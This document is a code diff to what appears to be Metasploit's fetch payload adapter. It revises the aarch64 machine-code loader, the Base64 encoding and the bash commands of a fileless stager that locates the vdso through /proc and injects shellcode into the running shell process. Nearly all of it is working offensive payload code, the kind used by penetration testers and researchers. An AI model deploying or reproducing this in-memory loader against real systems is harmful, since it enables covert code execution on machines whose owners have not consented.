@@ -331,19 +331,20 @@ module Msf::Payload::Adapter::Fetch
       # pid = getpid()
       # kill(pid,SIGSTOP)
       in_memory_loader_asm = [
-          0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
-          0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
-          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
-          0x210080d2, #0x100c:	mov	x1, #1	0x210080d2
-          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
-          0x010000d4, #0x1014:	svc	#0	0x010000d4
-          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
-          0x010000d4, #0x101c:	svc	#0	0x010000d4
-          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
-          0x010000d4, #0x1024:	svc	#0	0x010000d4
-          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
-          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
-          0x010000d4, #0x1030:	svc	#0	0x010000d4
+        0x802888d2, #0x1000:	mov	x0, #0x4144	0x802888d2
+          0xa088a8f2, #0x1004:	movk	x0, #0x4445, lsl #16	0xa088a8f2
+          0xe00f1ff8, #0x1008:	str	x0, [sp, #-0x10]!	0xe00f1ff8
+          0xe0030091, #0x100c:	mov	x0, sp	0xe0030091
+          0x210001ca, #0x1010:	eor	x1, x1, x1	0x210001ca
+          0xe82280d2, #0x1014:	mov	x8, #0x117	0xe82280d2
+          0x010000d4, #0x1018:	svc	#0	0x010000d4
+          0xc80580d2, #0x101c:	mov	x8, #0x2e	0xc80580d2
+          0x010000d4, #0x1020:	svc	#0	0x010000d4
+          0x881580d2, #0x1024:	mov	x8, #0xac	0x881580d2
+          0x010000d4, #0x1028:	svc	#0	0x010000d4
+          0x610280d2, #0x102c:	mov	x1, #0x13	0x610280d2
+          0x281080d2, #0x1030:	mov	x8, #0x81	0x281080d2
+          0x010000d4, #0x1034:	svc	#0	0x010000d4
       ]
       payload = in_memory_loader_asm.pack("N*")
     when 'armle'
@@ -474,7 +475,7 @@ module Msf::Payload::Adapter::Fetch
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
-    Base64.strict_encode64(payload)
+    Base64.encode64(payload)
   end
 
   def _generate_jmp_instruction
@@ -487,7 +488,7 @@ module Msf::Payload::Adapter::Fetch
     when 'x86'
       %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     when 'aarch64'
-      %^"4000005800001fd6"$(echo $(printf %16x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"4000005800001fd6"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
     when 'armle'
       %^$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')"0"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"e3"^
     when 'armbe'
@@ -514,7 +515,7 @@ module Msf::Payload::Adapter::Fetch
   def _generate_fileless_bash(get_file_cmd)
     stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
     stage_cmd << %(jmp=#{_generate_jmp_instruction};)
-    stage_cmd << "sc=$(base64 -d <<< #{_generate_first_stage_shellcode});"
+    stage_cmd << "sc=$(echo '#{_generate_first_stage_shellcode}' | base64 -d);"
     stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
     stage_cmd << 'read syscall_info < /proc/self/syscall;'
     stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
